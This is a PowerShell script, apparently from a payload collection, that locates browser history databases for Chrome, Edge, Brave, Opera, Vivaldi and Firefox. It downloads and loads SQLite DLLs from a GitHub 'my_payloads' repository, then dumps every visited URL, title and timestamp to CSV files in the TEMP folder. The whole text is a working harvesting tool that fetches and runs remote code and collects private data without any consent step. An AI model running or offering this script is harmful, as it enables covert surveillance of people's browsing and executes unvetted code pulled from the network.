# Define browser paths
$BrowserHistoryPaths = @{
    "Google_Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    "Microsoft_Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    "Brave"          = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
    "Opera"          = "$env:APPDATA\Opera Software\Opera Stable\History"
    "Vivaldi"        = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\History"
}

# Find firefox history
$FirefoxProfilesPath =  "$env:APPDATA\Mozilla\Firefox\Profiles"

if(Test-Path $FirefoxProfilesPath -PathType Container){
    $Profiles = Get-ChildItem -Path $FirefoxProfilesPath -Directory -Force

    foreach($profile in $Profiles){

        $FirefoxHistorydb = "$FirefoxProfilesPath\$($profile.Name)\places.sqlite"

        if(Test-Path $FirefoxHistorydb -PathType Leaf){
            $BrowserHistoryPaths["Firefox"] = $FirefoxHistorydb
            break
        }
    }
}



# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath

# Iterate through detected browsers
foreach ($Browser in $BrowserHistoryPaths.Keys) {
    $HistoryDB = $BrowserHistoryPaths[$Browser]

    if (Test-Path $HistoryDB) {
        # Create a temporary copy to avoid file lock issues
        $TempDB = "$env:TEMP\${Browser}_History.db"
        Copy-Item -Path $HistoryDB -Destination $TempDB -Force

       # Define SQLite query
        if ($Browser -eq "Firefox") {
            # Firefox stores history in "moz_places" table
            $Query = "SELECT url, title, datetime(visit_date/1000000, 'unixepoch', 'localtime') AS last_visited FROM moz_places INNER JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC"
        } else {
            # Chromium-based browsers
            $Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"
        }

        # Connect to SQLite database
        $Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
        $Connection.Open()

        # Execute query
        $Command = $Connection.CreateCommand()
        $Command.CommandText = $Query
        $Reader = $Command.ExecuteReader()

        # Store history
        $History = @()
        while ($Reader.Read()) {
            $History += [PSCustomObject]@{
                URL         = $Reader["url"]
                Title       = $Reader["title"]
                LastVisited = $Reader["last_visited"]
            }
        }

        # Close connection
        $Reader.Close()
        $Connection.Close()

	    # Write-Output "Browsing History from ${Browser}:"
	    # $History | Format-Table -AutoSize

        # Save history to CSV
        $CsvPath = "$env:TEMP\$Browser-History.csv"
        $History | Export-Csv -Path $CsvPath -NoTypeInformation

        # Output result
        Write-Output "History saved: $CsvPath"

        # Cleanup temp files
        Remove-Item -Path $TempDB -Force
    }
    else{
    	Write-Output "The ${Browser} history file has not been found."
    }
}
